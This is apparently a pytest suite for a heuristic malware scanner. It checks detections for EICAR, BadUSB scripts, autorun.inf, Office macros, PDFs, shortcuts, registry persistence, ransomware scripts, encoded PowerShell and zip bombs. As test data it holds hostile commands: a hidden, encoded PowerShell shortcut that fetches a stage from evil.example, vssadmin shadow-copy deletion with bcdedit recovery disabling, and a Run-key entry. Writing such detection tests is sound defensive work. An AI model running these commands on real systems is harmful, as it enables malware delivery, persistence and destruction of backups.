"""Detection-by-detection tests for the built-in heuristic engine.

Every test builds a small, deterministic sample inside tmp_path and drives
HeuristicEngine.scan_batch() with a ScanContext, which is the same entry point
the scan orchestrator uses.  The engine is always built with an explicit hash
database so that the digest list shipped in dcs/data/hashes.txt can never
change what these tests see; that shipped file has a test of its own.

Layout: helpers first, then one test per detection, then the engine level
behaviour (status, special files, size limits) and finally the negative tests
that prove ordinary media stays quiet.
"""

from __future__ import annotations

import base64
import hashlib
import io
import re
import struct
import zipfile
from collections.abc import Sequence
from pathlib import Path
from typing import Any

import pytest

from conftest import (
    DUCKY_PAYLOAD,
    EICAR,
    SampleBuilder,
    lnk_file,
    ole_macro_document,
    zip_bomb_bytes,
)
from dcs.core.config import ScanConfig
from dcs.core.events import Finding, NullSink, Severity, severity_rank
from dcs.core.scanner import rules
from dcs.core.scanner.base import ScanContext
from dcs.core.scanner.heuristic import (
    DuckyVerdict,
    HeuristicEngine,
    analyze_ducky_script,
    load_hash_db,
)
from dcs.core.util import FileEntry

# ---------------------------------------------------------------------------
# helpers
# ---------------------------------------------------------------------------


def make_entry(path: Path, root: Path, **overrides: Any) -> FileEntry:
    """Build the FileEntry that the walker would produce for path under root."""
    values: dict[str, Any] = {
        "path": str(path),
        "size": path.stat().st_size if path.exists() else 0,
        "relative": path.relative_to(root).as_posix(),
    }
    values.update(overrides)
    return FileEntry(**values)


def findings_for(
    path: Path,
    engine: HeuristicEngine,
    root: Path,
    *,
    config: ScanConfig | None = None,
    **entry_overrides: Any,
) -> list[Finding]:
    """Scan one file through scan_batch() and return all of its findings."""
    ctx = ScanContext(root=str(root), config=config or ScanConfig(), sink=NullSink())
    return list(engine.scan_batch([make_entry(path, root, **entry_overrides)], ctx))


def threats(findings: Sequence[Finding]) -> list[str]:
    """Threat names of the findings, for readable assertion failures."""
    return [finding.threat for finding in findings]


def only(findings: Sequence[Finding], threat: str) -> Finding:
    """Return the one finding called threat, failing loudly when it is not one."""
    matches = [finding for finding in findings if finding.threat == threat]
    assert len(matches) == 1, f"expected exactly one {threat!r}, got {threats(findings)}"
    return matches[0]


def encrypted_zip_bytes(name: str, data: bytes) -> bytes:
    """Build a ZIP whose member is really marked as encrypted.

    zipfile can only read encrypted archives and never writes them
    (setpassword() merely records a password for reading), so the general
    purpose bit flag 0 is set in both the local header and the central
    directory.  ZipInfo.flag_bits, which is what a scanner reads, then reports
    the member as encrypted and reading it needs a password.

    conftest ships an equivalent helper (SampleBuilder.password_zip), kept here
    as a local function so this test spells out exactly which bytes a scanner
    sees.
    """
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w", zipfile.ZIP_DEFLATED) as archive:
        archive.writestr(name, data)
    blob = bytearray(buffer.getvalue())
    for offset, flag_offset in ((blob.find(b"PK\x03\x04"), 6), (blob.rfind(b"PK\x01\x02"), 8)):
        assert offset >= 0, "the built archive has no header to patch"
        flags = struct.unpack_from("<H", blob, offset + flag_offset)[0]
        struct.pack_into("<H", blob, offset + flag_offset, flags | 0x1)
    return bytes(blob)


def ooxml_with_embedded_object() -> bytes:
    """An OOXML document carrying an embedded OLE object but no macro."""
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w") as archive:
        archive.writestr("[Content_Types].xml", "<Types/>")
        archive.writestr("word/document.xml", "<w:document/>")
        archive.writestr("word/embeddings/oleObject1.bin", b"\xd0\xcf\x11\xe0" + b"\x00" * 128)
    return buffer.getvalue()


def cfb_document(payload: bytes) -> bytes:
    """A CFB/OLE container with the given bytes appended after the header."""
    return bytes.fromhex("d0cf11e0a1b11ae1") + b"\x00" * 512 + payload


#: a DuckyScript body with enough HID commands but no dangerous key word
DUCKY_SAFE_SCRIPT = "\n".join(
    [
        "DELAY 1000",
        "GUI r",
        "DELAY 500",
        "STRING hello world",
        "ENTER",
        "DELAY 2000",
        "STRING hello again",
        "ENTER",
    ]
)

#: a shortcut target that the .lnk checks have to decode as UTF-16LE
LNK_DANGEROUS_TARGET = (
    "C:\\Windows\\System32\\cmd.exe /c powershell -w hidden -enc SQBFAFgA "
    "http://evil.example/stage.ps1"
)

BENIGN_SAMPLES: tuple[tuple[str, bytes], ...] = (
    ("readme.txt", b"Photos and documents from the trip.\n"),
    ("docs/report.pdf", b"%PDF-1.7\n1 0 obj\n<< /Type /Catalog >>\nendobj\ntrailer\n%%EOF\n"),
    ("photos/holiday.jpg", b"\xff\xd8\xff\xe0\x00\x10JFIF\x00" + b"\x00" * 256),
    ("music/song.mp3", b"ID3\x03\x00\x00\x00" + b"\x00" * 512),
)


@pytest.fixture
def engine() -> HeuristicEngine:
    """An engine with an empty hash database, so only the check under test fires."""
    return HeuristicEngine(hash_db={})


@pytest.fixture(scope="module")
def zip_bomb() -> bytes:
    """One deflate bomb of zeros, built once because compressing it takes seconds."""
    return zip_bomb_bytes()


# ---------------------------------------------------------------------------
# 1. EICAR
# ---------------------------------------------------------------------------


def test_eicar_marker_in_a_text_file_is_critical(
    tmp_path: Path, sample_builder: SampleBuilder, engine: HeuristicEngine
) -> None:
    path = sample_builder.write(tmp_path, "test.txt", sample_builder.eicar())

    findings = findings_for(path, engine, tmp_path)

    assert threats(findings) == ["EICAR-AV-Test-File"]
    assert findings[0].severity is Severity.CRITICAL
    assert findings[0].category == "test-file"
    assert findings[0].path == str(path)
    assert "EICAR test pattern" in findings[0].detail


# ---------------------------------------------------------------------------
# 2. known hashes
# ---------------------------------------------------------------------------


def test_known_hash_from_a_hash_db_is_critical(tmp_path: Path) -> None:
    path = tmp_path / "sample.bin"
    path.write_bytes(b"pretend malware payload for the hash database test\n")
    digest = hashlib.sha256(path.read_bytes()).hexdigest()
    engine = HeuristicEngine(hash_db={digest: "Test.Malware.Gen"})

    findings = findings_for(path, engine, tmp_path)

    assert threats(findings) == ["known malware hash: Test.Malware.Gen"]
    assert findings[0].severity is Severity.CRITICAL
    assert findings[0].category == "known-hash"
    assert findings[0].sha256 == digest
    assert digest in findings[0].detail


def test_files_absent_from_the_hash_db_get_no_known_hash_finding(tmp_path: Path) -> None:
    clean = tmp_path / "clean.bin"
    clean.write_bytes(b"a perfectly ordinary file\n")
    other = tmp_path / "other.bin"
    other.write_bytes(b"some other bytes\n")
    database = {hashlib.sha256(other.read_bytes()).hexdigest(): "Other.Threat"}
    engine = HeuristicEngine(hash_db=database)

    assert findings_for(clean, engine, tmp_path) == []
    assert engine.status().warnings == []


def test_the_shipped_hash_database_maps_the_eicar_digest() -> None:
    digest = hashlib.sha256(EICAR).hexdigest()

    assert load_hash_db()[digest] == "EICAR-AV-Test-File"


# ---------------------------------------------------------------------------
# 3. Rubber Ducky / HID payload scripts
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("name", ["payload.txt", "inject.bin"])
def test_a_ducky_file_name_alone_reports_a_physical_payload(
    tmp_path: Path, sample_builder: SampleBuilder, engine: HeuristicEngine, name: str
) -> None:
    path = sample_builder.write(tmp_path, name, "an ordinary text file, not a script\n")

    findings = findings_for(path, engine, tmp_path)

    finding = only(findings, "possible physical payload file")
    assert finding.severity is Severity.MEDIUM
    assert finding.category == "physical-payload"


def test_a_ducky_script_with_dangerous_keywords_is_critical(
    tmp_path: Path, sample_builder: SampleBuilder, engine: HeuristicEngine
) -> None:
    path = sample_builder.write(tmp_path, "script.txt", DUCKY_PAYLOAD)

    findings = findings_for(path, engine, tmp_path)

    finding = only(findings, "Rubber Ducky / BadUSB payload script")
    assert finding.severity is Severity.CRITICAL
    assert finding.category == "physical-payload"
    assert "Dangerous payload steps" in finding.detail
    verdict = analyze_ducky_script(DUCKY_PAYLOAD)
    assert verdict.commands >= 5
    assert verdict.command_ratio >= 0.30
    assert "runs PowerShell" in verdict.keywords


@pytest.mark.parametrize(
    ("name", "expected"),
    [("notes.txt", Severity.MEDIUM), ("payload.txt", Severity.HIGH)],
)
def test_a_ducky_script_without_dangerous_keywords_is_only_downgraded(
    tmp_path: Path,
    sample_builder: SampleBuilder,
    engine: HeuristicEngine,
    name: str,
    expected: Severity,
) -> None:
    path = sample_builder.write(tmp_path, name, DUCKY_SAFE_SCRIPT)

    findings = findings_for(path, engine, tmp_path)

    finding = only(findings, "Rubber Ducky / BadUSB payload script")
    assert finding.severity is expected
    assert finding.category == "physical-payload"
    assert "Dangerous payload steps" not in finding.detail
    verdict = analyze_ducky_script(DUCKY_SAFE_SCRIPT)
    assert verdict.is_payload
    assert verdict.keywords == []


def test_analyze_ducky_script_applies_both_thresholds() -> None:
    assert analyze_ducky_script(None) == DuckyVerdict()
    assert analyze_ducky_script("") == DuckyVerdict()
    assert analyze_ducky_script("REM nothing to see\n").commands == 0

    four = "DELAY 100\nSTRING hi\nENTER\nGUI r"
    assert analyze_ducky_script(four).commands == 4
    assert analyze_ducky_script(four).is_payload is False

    commands = "DELAY 1\nENTER\nGUI r\nSTRING hi\nSTRING there\nTAB"
    on_the_line = commands + "\n" + "\n".join(["some prose line"] * 14)
    verdict = analyze_ducky_script(on_the_line)
    assert verdict.commands == 6
    assert verdict.command_ratio == pytest.approx(0.30)
    assert verdict.is_payload is True

    below_the_line = commands + "\n" + "\n".join(["some prose line"] * 15)
    assert analyze_ducky_script(below_the_line).command_ratio < 0.30
    assert analyze_ducky_script(below_the_line).is_payload is False

    keywords = analyze_ducky_script(
        "STRING powershell -w hidden\nDELAY 500\nGUI r\nENTER\nSTRING cmd.exe\nENTER"
    )
    assert keywords.commands == 6
    assert {"runs PowerShell", "hides its window", "opens a command prompt"} <= set(keywords.keywords)


# ---------------------------------------------------------------------------
# 4. double extensions
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    ("relative", "decoy", "final"),
    [("docs/report.pdf.exe", ".pdf", ".exe"), ("docs/photo.jpg.scr", ".jpg", ".scr")],
)
def test_a_double_extension_is_high(
    tmp_path: Path,
    sample_builder: SampleBuilder,
    engine: HeuristicEngine,
    relative: str,
    decoy: str,
    final: str,
) -> None:
    path = sample_builder.write(tmp_path, relative, "This file only looks like a document.\n")

    findings = findings_for(path, engine, tmp_path)

    assert threats(findings) == ["double extension executable"]
    assert findings[0].severity is Severity.HIGH
    assert findings[0].category == "masquerading"
    assert findings[0].detail == f"The file pretends to be {decoy} but is executed as {final}."


def test_a_single_extension_executable_is_not_a_double_extension(
    tmp_path: Path, sample_builder: SampleBuilder, engine: HeuristicEngine
) -> None:
    path = sample_builder.write(tmp_path, "docs/program.exe", "just a program\n")

    assert findings_for(path, engine, tmp_path) == []


# ---------------------------------------------------------------------------
# 5. placement in the drive root
# ---------------------------------------------------------------------------


def test_an_executable_in_the_drive_root_is_medium(
    tmp_path: Path, sample_builder: SampleBuilder, engine: HeuristicEngine
) -> None:
    path = sample_builder.write(tmp_path, "setup.exe", sample_builder.pe(size=2048))

    findings = findings_for(path, engine, tmp_path)

    finding = only(findings, "executable in the root of the drive")
    assert finding.severity is Severity.MEDIUM
    assert finding.category == "placement"


def test_an_executable_in_a_subdirectory_is_not_flagged(
    tmp_path: Path, sample_builder: SampleBuilder, engine: HeuristicEngine
) -> None:
    path = sample_builder.write(tmp_path, "tools/setup.exe", sample_builder.pe(size=2048))

    findings = findings_for(path, engine, tmp_path)

    assert "executable in the root of the drive" not in threats(findings)


# ---------------------------------------------------------------------------
# 6. autorun.inf
# ---------------------------------------------------------------------------


def test_autorun_pointing_at_an_existing_payload_is_critical(
    tmp_path: Path, sample_builder: SampleBuilder, engine: HeuristicEngine
) -> None:
    sample_builder.write(tmp_path, "setup.exe", b"MZ" + b"\x00" * 32)
    path = sample_builder.write(tmp_path, "autorun.inf", "[autorun]\nopen=setup.exe\n")

    findings = findings_for(path, engine, tmp_path)

    finding = only(findings, "autorun.inf launches a payload")
    assert finding.severity is Severity.CRITICAL
    assert finding.category == "autorun"
    assert "open=setup.exe" in finding.detail


def test_autorun_pointing_at_a_missing_executable_is_critical(
    tmp_path: Path, sample_builder: SampleBuilder, engine: HeuristicEngine
) -> None:
    path = sample_builder.write(tmp_path, "autorun.inf", "[autorun]\nopen=missing.exe\n")

    findings = findings_for(path, engine, tmp_path)

    assert only(findings, "autorun.inf launches a payload").severity is Severity.CRITICAL


def test_autorun_without_a_reachable_payload_is_high(
    tmp_path: Path, sample_builder: SampleBuilder, engine: HeuristicEngine
) -> None:
    path = sample_builder.write(tmp_path, "autorun.inf", "[autorun]\nshellexecute=launch_stub\n")

    findings = findings_for(path, engine, tmp_path)

    finding = only(findings, "autorun.inf launches a payload")
    assert finding.severity is Severity.HIGH
    assert "shellexecute=launch_stub" in finding.detail


@pytest.mark.xfail(reason="an icon-only autorun.inf is reported as launching a payload")
def test_an_icon_only_autorun_inf_is_not_reported_as_a_launcher(
    tmp_path: Path, sample_builder: SampleBuilder, engine: HeuristicEngine
) -> None:
    """A stick that merely shows a custom icon must not be called a launcher.

    The engine treats icon= and action= as command keys and then reports
    "autorun.inf launches a payload" at HIGH, although neither key executes
    anything.
    """
    path = sample_builder.write(
        tmp_path, "autorun.inf", "[autorun]\nicon=setup.exe,0\nlabel=Holiday\n"
    )

    findings = findings_for(path, engine, tmp_path)

    assert [finding for finding in findings if finding.category == "autorun"] == []


def test_autorun_without_command_keys_has_no_autorun_finding(
    tmp_path: Path, sample_builder: SampleBuilder, engine: HeuristicEngine
) -> None:
    path = sample_builder.write(
        tmp_path, "autorun.inf", "[autorun]\nlabel=Holiday Photos\n; no command keys here\n"
    )

    findings = findings_for(path, engine, tmp_path)

    assert [finding for finding in findings if finding.category == "autorun"] == []
    assert only(findings, "autorun.inf boot script").severity is Severity.MEDIUM


# ---------------------------------------------------------------------------
# 7. legacy Office / CFB documents
# ---------------------------------------------------------------------------


def test_a_cfb_macro_with_an_automatic_entry_point_is_critical(
    tmp_path: Path, sample_builder: SampleBuilder, engine: HeuristicEngine
) -> None:
    path = sample_builder.write(
        tmp_path, "invoice.doc", ole_macro_document(auto_open=True, shell=False)
    )

    findings = findings_for(path, engine, tmp_path)

    assert threats(findings) == ["Office macro with automatic execution"]
    assert findings[0].severity is Severity.CRITICAL
    assert findings[0].category == "office"
    assert "(autoopen)" in findings[0].detail


def test_a_cfb_macro_without_an_automatic_entry_point_is_high(
    tmp_path: Path, sample_builder: SampleBuilder, engine: HeuristicEngine
) -> None:
    path = sample_builder.write(
        tmp_path, "quote.doc", ole_macro_document(auto_open=False, shell=False)
    )

    findings = findings_for(path, engine, tmp_path)

    finding = only(findings, "Office macro with automatic execution")
    assert finding.severity is Severity.HIGH
    assert "automatic entry point" not in finding.detail
    assert "start other programs" not in finding.detail


def test_a_cfb_without_macro_evidence_is_silent(
    tmp_path: Path, sample_builder: SampleBuilder, engine: HeuristicEngine
) -> None:
    path = sample_builder.write(
        tmp_path, "notes.doc", cfb_document(b"SummaryInformation" + b"\x00" * 64)
    )

    assert findings_for(path, engine, tmp_path) == []


def test_a_cfb_without_macro_evidence_is_reported_as_a_legacy_document(
    tmp_path: Path, sample_builder: SampleBuilder, engine: HeuristicEngine
) -> None:
    path = sample_builder.write(
        tmp_path, "notes.doc", cfb_document(b"MSWordDoc" + b"\x00" * 64)
    )

    findings = findings_for(path, engine, tmp_path)

    assert threats(findings) == ["legacy Office document"]
    assert findings[0].severity is Severity.INFO
    assert findings[0].category == "office"


# ---------------------------------------------------------------------------
# 8. OOXML documents
# ---------------------------------------------------------------------------


def test_an_ooxml_document_with_a_vba_project_is_high(
    tmp_path: Path, sample_builder: SampleBuilder, engine: HeuristicEngine
) -> None:
    path = sample_builder.write(tmp_path, "quote.docm", sample_builder.ooxml())

    findings = findings_for(path, engine, tmp_path)

    assert threats(findings) == ["Office document with VBA macro"]
    assert findings[0].severity is Severity.HIGH
    assert findings[0].category == "office"


def test_an_ooxml_document_with_an_embedded_object_is_medium(
    tmp_path: Path, sample_builder: SampleBuilder, engine: HeuristicEngine
) -> None:
    path = sample_builder.write(tmp_path, "quote.docm", ooxml_with_embedded_object())

    findings = findings_for(path, engine, tmp_path)

    assert threats(findings) == ["Office document with embedded object"]
    assert findings[0].severity is Severity.MEDIUM
    assert findings[0].category == "office"


def test_an_ooxml_relationship_to_remote_content_is_high(
    tmp_path: Path, sample_builder: SampleBuilder, engine: HeuristicEngine
) -> None:
    path = sample_builder.write(
        tmp_path, "quote.docm", sample_builder.ooxml(macro=False, external=True)
    )

    findings = findings_for(path, engine, tmp_path)

    assert threats(findings) == ["external content reference"]
    assert findings[0].severity is Severity.HIGH
    assert findings[0].category == "office"
    assert "settings.xml.rels" in findings[0].detail


# ---------------------------------------------------------------------------
# 9. PDFs
# ---------------------------------------------------------------------------


def test_a_pdf_with_open_action_and_javascript_is_high(
    tmp_path: Path, sample_builder: SampleBuilder, engine: HeuristicEngine
) -> None:
    path = sample_builder.write(
        tmp_path,
        "ticket.pdf",
        b"%PDF-1.5\n1 0 obj << /Type /Catalog /OpenAction 2 0 R >> endobj\n"
        b"2 0 obj << /S /JavaScript /JS (app.alert(1)) >> endobj\ntrailer\n%%EOF\n",
    )

    findings = findings_for(path, engine, tmp_path)

    assert threats(findings) == ["PDF with automatic JavaScript"]
    assert findings[0].severity is Severity.HIGH
    assert findings[0].category == "document"


def test_a_pdf_with_javascript_but_no_open_action_is_medium(
    tmp_path: Path, sample_builder: SampleBuilder, engine: HeuristicEngine
) -> None:
    path = sample_builder.write(
        tmp_path,
        "ticket.pdf",
        b"%PDF-1.5\n1 0 obj << /S /JavaScript /JS (app.alert(1)) >> endobj\ntrailer\n%%EOF\n",
    )

    findings = findings_for(path, engine, tmp_path)

    assert threats(findings) == ["PDF with active content"]
    assert findings[0].severity is Severity.MEDIUM
    assert findings[0].category == "document"


def test_a_plain_pdf_produces_no_finding(
    tmp_path: Path, sample_builder: SampleBuilder, engine: HeuristicEngine
) -> None:
    path = sample_builder.write(
        tmp_path,
        "docs/report.pdf",
        b"%PDF-1.7\n1 0 obj\n<< /Type /Catalog >>\nendobj\ntrailer\n%%EOF\n",
    )

    assert findings_for(path, engine, tmp_path) == []


# ---------------------------------------------------------------------------
# 10. shortcuts
# ---------------------------------------------------------------------------


def test_a_shortcut_to_an_interpreter_running_minimized_is_high(
    tmp_path: Path, sample_builder: SampleBuilder, engine: HeuristicEngine
) -> None:
    path = sample_builder.write(
        tmp_path, "files/photos.lnk", lnk_file(LNK_DANGEROUS_TARGET, show_command=7)
    )

    findings = findings_for(path, engine, tmp_path)

    assert sorted(threats(findings)) == ["shortcut file", "suspicious shortcut"]
    finding = only(findings, "suspicious shortcut")
    assert finding.severity is Severity.HIGH
    assert finding.category == "shortcut"
    assert "starts a command interpreter" in finding.detail
    assert "is configured to run minimized" in finding.detail
    assert "contains a URL" in finding.detail
    assert "UNC" not in finding.detail


def test_a_shortcut_to_a_share_is_reported_as_a_unc_path(
    tmp_path: Path, sample_builder: SampleBuilder, engine: HeuristicEngine
) -> None:
    path = sample_builder.write(
        tmp_path, "files/photos.lnk", lnk_file("\\\\server\\share\\notes.txt", show_command=1)
    )

    findings = findings_for(path, engine, tmp_path)

    finding = only(findings, "suspicious shortcut")
    assert finding.severity is Severity.HIGH
    assert "UNC network path" in finding.detail
    assert "minimized" not in finding.detail


def test_a_benign_shortcut_produces_no_shortcut_finding(
    tmp_path: Path, sample_builder: SampleBuilder, engine: HeuristicEngine
) -> None:
    path = sample_builder.write(
        tmp_path, "files/holiday.lnk", lnk_file("C:\\Users\\Public\\holiday.jpg", show_command=1)
    )

    findings = findings_for(path, engine, tmp_path)

    assert threats(findings) == ["shortcut file"]
    assert findings[0].severity is Severity.LOW


# ---------------------------------------------------------------------------
# 11. registry content
# ---------------------------------------------------------------------------


def test_a_run_key_in_a_reg_file_is_high(
    tmp_path: Path, sample_builder: SampleBuilder, engine: HeuristicEngine
) -> None:
    path = sample_builder.write(
        tmp_path,
        "fix.reg",
        "Windows Registry Editor Version 5.00\n"
        "\n"
        "[HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run]\n"
        '"updater"="C:\\Users\\Public\\a.exe"\n',
    )

    findings = findings_for(path, engine, tmp_path)

    assert threats(findings) == ["run-key persistence"]
    assert findings[0].severity is Severity.HIGH
    assert findings[0].category == "registry"


def test_disabling_the_antivirus_through_the_registry_is_critical(
    tmp_path: Path, sample_builder: SampleBuilder, engine: HeuristicEngine
) -> None:
    path = sample_builder.write(
        tmp_path,
        "fix.reg",
        "Windows Registry Editor Version 5.00\n"
        "\n"
        "[HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender]\n"
        '"DisableAntiSpyware"=dword:00000000\n',
    )

    findings = findings_for(path, engine, tmp_path)

    assert threats(findings) == ["antivirus disabled via registry"]
    assert findings[0].severity is Severity.CRITICAL
    assert findings[0].category == "registry"


# ---------------------------------------------------------------------------
# 12. ransomware behaviour
# ---------------------------------------------------------------------------


def test_a_batch_script_deleting_shadow_copies_is_critical_and_in_the_root(
    tmp_path: Path, sample_builder: SampleBuilder, engine: HeuristicEngine
) -> None:
    path = sample_builder.write(
        tmp_path,
        "cleanup.bat",
        "vssadmin delete shadows /all /quiet\n"
        "wmic shadowcopy delete\n"
        "bcdedit /set {default} recoveryenabled No\n",
    )

    findings = findings_for(path, engine, tmp_path)

    assert sorted(threats(findings)) == [
        "backup destruction",
        "executable in the root of the drive",
    ]
    backup = only(findings, "backup destruction")
    assert backup.severity is Severity.CRITICAL
    assert backup.category == "script"
    assert "vssadmin delete shadows" in backup.detail
    assert only(findings, "executable in the root of the drive").severity is Severity.MEDIUM


# ---------------------------------------------------------------------------
# 13. encoded PowerShell
# ---------------------------------------------------------------------------


def test_a_powershell_encoded_command_is_critical(
    tmp_path: Path, sample_builder: SampleBuilder, engine: HeuristicEngine
) -> None:
    blob = base64.b64encode(b"Write-Host 'an encoded stage two payload' " * 3).decode("ascii")
    assert len(blob) >= 80
    path = sample_builder.write(tmp_path, "bin/stage1.ps1", f"powershell.exe -enc {blob}\n")

    findings = findings_for(path, engine, tmp_path)

    assert threats(findings) == ["PowerShell encoded command"]
    assert findings[0].severity is Severity.CRITICAL
    assert findings[0].category == "script"


def test_a_short_base64_blob_is_not_an_encoded_command(
    tmp_path: Path, sample_builder: SampleBuilder, engine: HeuristicEngine
) -> None:
    path = sample_builder.write(
        tmp_path, "bin/stage1.ps1", "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AA==\n"
    )

    assert findings_for(path, engine, tmp_path) == []


# ---------------------------------------------------------------------------
# 14. archive bombs
# ---------------------------------------------------------------------------


def test_a_zip_bomb_is_high(
    tmp_path: Path,
    sample_builder: SampleBuilder,
    engine: HeuristicEngine,
    zip_bomb: bytes,
) -> None:
    path = sample_builder.write(tmp_path, "photos_backup.zip", zip_bomb)
    with zipfile.ZipFile(path) as archive:
        infos = archive.infolist()
    ratio = sum(info.file_size for info in infos) / sum(info.compress_size for info in infos)
    assert ratio > rules.ZIP_BOMB_RATIO

    findings = findings_for(path, engine, tmp_path)

    finding = only(findings, "suspected zip bomb")
    assert finding.severity is Severity.HIGH
    assert finding.category == "archive"
    assert f"Expansion ratio {ratio:.0f}:1" in finding.detail


# ---------------------------------------------------------------------------
# 15. password protected archives
# ---------------------------------------------------------------------------


def test_a_password_protected_zip_is_high(
    tmp_path: Path, sample_builder: SampleBuilder, engine: HeuristicEngine
) -> None:
    path = sample_builder.write(
        tmp_path, "secret.zip", encrypted_zip_bytes("secret.txt", b"payload")
    )
    with zipfile.ZipFile(path) as archive:
        assert [info.flag_bits & 0x1 for info in archive.infolist()] == [1]

    findings = findings_for(path, engine, tmp_path)

    finding = only(findings, "password protected archive")
    assert finding.severity is Severity.HIGH
    assert finding.category == "archive"
    assert "1 member(s) are encrypted" in finding.detail


# ---------------------------------------------------------------------------
# 16. archive layout
# ---------------------------------------------------------------------------


def test_an_archive_with_executables_at_its_root_is_medium(
    tmp_path: Path, sample_builder: SampleBuilder, engine: HeuristicEngine
) -> None:
    archive = sample_builder.zip_of({"installer.exe": b"MZ" + b"\x00" * 64, "notes.txt": b"hi"})
    path = sample_builder.write(tmp_path, "tools.zip", archive)

    findings = findings_for(path, engine, tmp_path)

    assert threats(findings) == ["archive with executables at its root"]
    assert findings[0].severity is Severity.MEDIUM
    assert findings[0].category == "archive"
    assert "installer.exe" in findings[0].detail


def test_an_archive_with_nested_executables_is_not_flagged(
    tmp_path: Path, sample_builder: SampleBuilder, engine: HeuristicEngine
) -> None:
    archive = sample_builder.zip_of({"tools/installer.exe": b"MZ" + b"\x00" * 64})
    path = sample_builder.write(tmp_path, "tools.zip", archive)

    assert findings_for(path, engine, tmp_path) == []


# ---------------------------------------------------------------------------
# 17. packed and injection capable executables
# ---------------------------------------------------------------------------


def test_a_upx_executable_with_injection_apis_is_critical(
    tmp_path: Path, sample_builder: SampleBuilder, engine: HeuristicEngine
) -> None:
    path = sample_builder.write(
        tmp_path,
        "bin/invoice.exe",
        sample_builder.pe(
            section=b"UPX0",
            payload=b"WriteProcessMemory\x00CreateRemoteThread\x00GetAsyncKeyState\x00",
        ),
    )

    findings = findings_for(path, engine, tmp_path)

    packed = only(findings, "packed executable (UPX)")
    assert packed.severity is Severity.HIGH
    assert packed.category == "packer"
    injection = only(findings, "process injection API usage")
    assert injection.severity is Severity.CRITICAL
    assert injection.category == "executable"
    assert "WriteProcessMemory, CreateRemoteThread" in injection.detail
    keylogging = only(findings, "keystroke capture API usage")
    assert keylogging.severity is Severity.HIGH
    assert "GetAsyncKeyState" in keylogging.detail


# ---------------------------------------------------------------------------
# 18. entropy
# ---------------------------------------------------------------------------


def test_a_large_high_entropy_executable_is_medium(
    tmp_path: Path, sample_builder: SampleBuilder, engine: HeuristicEngine
) -> None:
    path = sample_builder.write(tmp_path, "bin/big.bin", sample_builder.pe(size=250_000))

    findings = findings_for(path, engine, tmp_path)

    finding = only(findings, "high entropy executable body")
    assert finding.severity is Severity.MEDIUM
    assert finding.category == "obfuscation"
    match = re.search(r"Entropy ([0-9.]+)/8", finding.detail)
    assert match is not None
    assert float(match.group(1)) > rules.HIGH_ENTROPY_THRESHOLD


@pytest.mark.parametrize(
    ("relative", "size"),
    [("bin/small.exe", 8192), ("bin/zeros.exe", 250_000)],
)
def test_a_small_or_low_entropy_executable_has_no_entropy_finding(
    tmp_path: Path, sample_builder: SampleBuilder, engine: HeuristicEngine, relative: str, size: int
) -> None:
    data = sample_builder.pe(size=size, fill=b"\x00" * size)
    path = sample_builder.write(tmp_path, relative, data)

    findings = findings_for(path, engine, tmp_path)

    assert "high entropy executable body" not in threats(findings)


# ---------------------------------------------------------------------------
# 19. negative tests
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(("relative", "data"), BENIGN_SAMPLES)
def test_benign_files_produce_no_finding(
    tmp_path: Path,
    sample_builder: SampleBuilder,
    engine: HeuristicEngine,
    relative: str,
    data: bytes,
) -> None:
    path = sample_builder.write(tmp_path, relative, data)

    assert findings_for(path, engine, tmp_path) == []


@pytest.mark.parametrize("relative", ["readme.txt", "notes.md"])
def test_benign_files_in_the_drive_root_are_never_high_or_critical(
    tmp_path: Path, sample_builder: SampleBuilder, engine: HeuristicEngine, relative: str
) -> None:
    path = sample_builder.write(tmp_path, relative, "Photos and documents from the trip.\n")

    findings = findings_for(path, engine, tmp_path)

    blocking = severity_rank(Severity.HIGH)
    assert [f for f in findings if severity_rank(f.severity) >= blocking] == []


# ---------------------------------------------------------------------------
# engine level behaviour
# ---------------------------------------------------------------------------


def test_status_reports_an_available_engine() -> None:
    database = {hashlib.sha256(b"listed sample").hexdigest(): "Listed.Sample"}
    engine = HeuristicEngine(hash_db=database)

    status = engine.status()

    assert engine.engine_id == "heuristic"
    assert status.engine_id == "heuristic"
    assert status.label == "DCS built-in heuristics"
    assert status.available is True
    assert status.version == "1.0"
    assert status.warnings == []
    assert "HID payload scripts" in status.detail
    assert status.to_dict()["id"] == "heuristic"


def test_status_warns_when_the_hash_database_is_empty() -> None:
    status = HeuristicEngine(hash_db={}).status()

    assert status.available is True
    assert status.version == "1.0"
    assert len(status.warnings) == 1
    assert "no hash database loaded" in status.warnings[0]


def test_a_special_file_is_medium(tmp_path: Path, engine: HeuristicEngine) -> None:
    findings = findings_for(tmp_path / "loop0", engine, tmp_path, is_special=True)

    assert threats(findings) == ["special file (device, fifo or socket)"]
    assert findings[0].severity is Severity.MEDIUM
    assert findings[0].category == "filesystem"
    assert findings[0].size == 0


def test_files_over_the_size_limit_are_not_read_for_content(
    tmp_path: Path, engine: HeuristicEngine
) -> None:
    path = tmp_path / "docs" / "big.pdf.exe"
    path.parent.mkdir()
    path.write_bytes(EICAR + b"\x00" * (2 * 1024 * 1024))

    limited = findings_for(path, engine, tmp_path, config=ScanConfig(max_file_size_mb=1))

    assert threats(limited) == ["double extension executable"]

    unlimited = findings_for(path, engine, tmp_path, config=ScanConfig(max_file_size_mb=0))

    assert sorted(threats(unlimited)) == ["EICAR-AV-Test-File", "double extension executable"]
